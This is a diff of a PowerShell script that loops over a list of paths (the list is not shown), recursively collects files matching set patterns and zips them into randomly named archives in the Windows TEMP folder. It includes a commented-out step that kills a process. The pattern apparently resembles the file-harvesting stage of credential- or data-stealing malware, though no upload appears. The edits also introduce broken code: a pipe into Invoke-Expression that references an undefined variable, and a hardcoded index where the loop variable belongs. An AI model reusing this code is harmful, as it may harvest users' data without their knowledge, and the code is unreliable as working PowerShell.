@@ -2,7 +2,7 @@
 echo "qwe"
 $e=""
 
-$p=$env:TEMP+"\d"+(Get-Random -max 17071707)+".zip"
+# $p=$env:TEMP+"\d"+(Get-Random -max 17071707)+".zip"
 
 if(Test-Path -Path "C:\Program Files\7-Zip\7z.exe"){
     Set-Location -Path "C:\Program Files\7-Zip\";
@@ -21,12 +21,18 @@ for ($i=0; $i -lt 5; $i++){
   if(Test-Path -Path $lst[$i][0]){
     echo '+++++++++'
     echo ($lst[$i][0])
+#     $p=$env:TEMP+"\d"+$lst[$i][1]+(Get-Random -max 17071707)+".zip"
+#     $str = ('$p{0}="{1}\d{2}.zip"' -f $i, $env:TEMP, $lst[$i][1])
+#     Invoke-Expression $str
+#     Invoke-Expression ('$p{0}="{1}\d{2}.zip"' -f $i, $env:TEMP, $lst[$i][1])
+    
     #Stop-Process -Name $el[1] -ErrorAction SilentlyContinue;
     if("W"-in $arh){
-      Get-ChildItem -Path $lst[$i][0] -Include $lst[$i][2], $lst[$i][3] -Recurse | Compress-Archive -Update -CompressionLevel Fastest -DestinationPath $p
+      Get-ChildItem -Path $lst[$i][0] -Include $lst[$i][2], $lst[$i][3] -Recurse | Invoke-Expression ('Compress-Archive -Update -CompressionLevel Fastest -DestinationPath $p{0}' -f $i)
     }
     else{
-      .\7z.exe a $p (Get-ChildItem -Path $lst[$i][0] -Include  $lst[$i][2], $lst[$i][3] -Recurse) -spf -tzip
+        .\7z.exe a ($env:TEMP+"\d"+$lst[1][1]+".zip") (Get-ChildItem -Path $lst[$i][0] -Include  $lst[$i][2], $lst[$i][3] -Recurse) -spf -tzip
+#       Invoke-Expression (".\7z.exe a $p{0} (Get-ChildItem -Path $lst[$i][0] -Include  $lst[$i][2], $lst[$i][3] -Recurse) -spf -tzip" -f $i)
     }
   }
   else{
